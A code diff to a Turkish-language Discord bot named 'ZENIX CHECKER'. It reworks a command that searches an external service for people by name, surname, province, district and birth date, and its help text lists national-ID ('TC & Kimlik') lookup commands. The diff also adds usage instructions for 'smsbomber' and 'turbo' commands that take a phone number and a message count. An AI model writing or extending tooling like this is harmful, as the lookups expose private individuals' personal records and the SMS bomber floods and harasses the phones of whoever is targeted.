@@ -499,29 +970,15 @@ async def z2_idsorgu(interaction: discord.Interaction, id: str):
 
 # ==================== /zenix3 — AD/SOYAD ====================
 @zenix3_group.command(name="adsoyad", description="Ad soyad arama")
-@app_commands.describe(
-    ad="Ad",
-    soyad="Soyad",
-    il="İl",
-    ilce="İlçe",
-    dogumtarihi="Doğum tarihi"
-)
-async def z3_adsoyad(
-    interaction: discord.Interaction,
-    ad: str,
-    soyad: Optional[str] = None,
-    il: Optional[str] = None,
-    ilce: Optional[str] = None,
-    dogumtarihi: Optional[str] = None
-):
+@app_commands.describe(ad="Ad", soyad="Soyad", il="İl", ilce="İlçe", dogumtarihi="Doğum tarihi")
+async def z3_adsoyad(interaction: discord.Interaction, ad: str, soyad: Optional[str] = None, il: Optional[str] = None, ilce: Optional[str] = None, dogumtarihi: Optional[str] = None):
     await interaction.response.defer()
     params = {"ad": ad, "key": SEARCH_KEY}
     if soyad:        params["soyad"] = soyad
     if il:           params["il"] = il
     if ilce:         params["ilce"] = ilce
     if dogumtarihi:  params["dogumtarihi"] = dogumtarihi
-    url = f"{SEARCHULP}/adsoyad?{urlencode(params)}"
-    data = await fetch_json(url)
+    data = await fetch_json(f"{SEARCHULP}/adsoyad?{urlencode(params)}")
     await send_result(interaction, data)
 
 
@@ -555,26 +1012,18 @@ async def yardim(interaction: discord.Interaction):
 
     embed = discord.Embed(
         title="✨  ZENIX CHECKER  ✨",
-        description=(
-            "🔎  Tüm sorgulama komutları aşağıda listelenmiştir.\n"
-            "━━━━━━━━━━━━━━━━━━━━━━━━━━"
-        ),
+        description="🔎 Tüm komutlar aşağıdadır.\n━━━━━━━━━━━━━━━━━━━━━━━━━━",
         color=COLOR_Z,
         timestamp=datetime.datetime.utcnow()
     )
+    embed.add_field(name="⚡ `/zenix` — Genel & SMS", value="`" + "` `".join(sorted(g1)) + "`", inline=False)
+    embed.add_field(name="🪪 `/zenix2` — TC & Kimlik", value="`" + "` `".join(sorted(g2)) + "`", inline=False)
+    embed.add_field(name="👤 `/zenix3` — Ad/Soyad", value="`" + "` `".join(sorted(g3)) + "`", inline=False)
     embed.add_field(
-        name="⚡ `/zenix` — Genel",
-        value="`" + "` `".join(sorted(g1)) + "`",
-        inline=False
-    )
-    embed.add_field(
-        name="🪪 `/zenix2` — TC & Kimlik",
-        value="`" + "` `".join(sorted(g2)) + "`",
-        inline=False
-    )
-    embed.add_field(
-        name="👤 `/zenix3` — Ad/Soyad",
-        value="`" + "` `".join(sorted(g3)) + "`",
+        name="💣 SMS BOMBER KULLANIM",
+        value="`/zenix smsbomber numara:5XX adet:1 mail:x@y.com`\n"
+              "`/zenix turbo numara:5XX adet:1 mail:x@y.com`\n"
+              "`/zenix servisler`",
         inline=False
     )
     embed.set_thumbnail(url=LOGO_URL)
@@ -582,7 +1031,7 @@ async def yardim(interaction: discord.Interaction):
     await interaction.response.send_message(embed=embed)
 
 
-@bot.tree.command(name="hosgeldin", description="ZENIX Checker hoş geldin mesajını gösterir")
+@bot.tree.command(name="hosgeldin", description="ZENIX hoş geldin mesajı")
 async def hosgeldin(interaction: discord.Interaction):
     await interaction.response.send_message(embed=build_welcome_embed())
 
